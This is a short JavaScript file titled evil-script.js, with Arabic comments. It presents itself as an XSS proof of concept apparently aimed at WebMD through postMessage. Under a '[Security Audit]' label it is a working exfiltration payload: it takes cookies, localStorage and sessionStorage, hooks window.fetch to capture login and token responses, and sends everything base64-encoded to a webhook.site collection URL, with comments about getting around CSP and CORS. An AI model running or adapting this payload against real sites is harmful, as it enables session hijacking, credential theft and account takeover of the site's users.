      // evil-script.js - PoC نظيف وبسيط
//console.log("Evil script LOADED successfully via postMessage on WebMD!");
alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie);
         // تشفير الكوكيز بـ Base64 قبل إرسالها
//var stolenData = btoa(document.cookie); 
//new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);

(function() {
    console.log("%c[Security Audit] Optimized Payload Active...", "color: cyan; font-weight: bold;");

    const webhookUrl = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/exfiltrate";

    // دالة الإرسال مع معالجة الخطأ
    const sendData = async (type, data) => {
        try {
            // تحويل البيانات لنص Base64 لتجنب مشاكل الـ CSP مع الـ JSON
            const payload = btoa(JSON.stringify(data));
            await fetch(`${webhookUrl}?type=${type}&data=${payload}`, {
                mode: 'no-cors', // لتجاوز بعض قيود الـ CORS
                cache: 'no-store'
            });
            console.log(`%c[+] Data Sent: ${type}`, "color: green;");
        } catch (e) {
            console.error("[-] Send failed:", e);
        }
    };

    // 1. سحب البيانات فوراً (مرة واحدة)
    const harvestEverything = () => {
        const loot = {
            cookies: document.cookie,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        sendData("full_dump", loot);
    };

    // 2. اعتراض الـ API (بدون تايمر - يعتمد على الطلب)
    const originalFetch = window.fetch;
    window.fetch = function() {
        return originalFetch.apply(this, arguments).then(async (response) => {
            const clone = response.clone();
            const url = arguments[0];
            
            // نركز فقط على طلبات الـ Login أو الـ Tokens
            if (url.includes("token") || url.includes("login") || url.includes("user")) {
                const data = await clone.json().catch(() => ({}));
                sendData("api_intercept", { url, data });
            }
            return response;
        });
    };

    // تنفيذ السحب الأول بعد 3 ثواني لضمان استقرار الصفحة
    setTimeout(harvestEverything, 3000);

})();
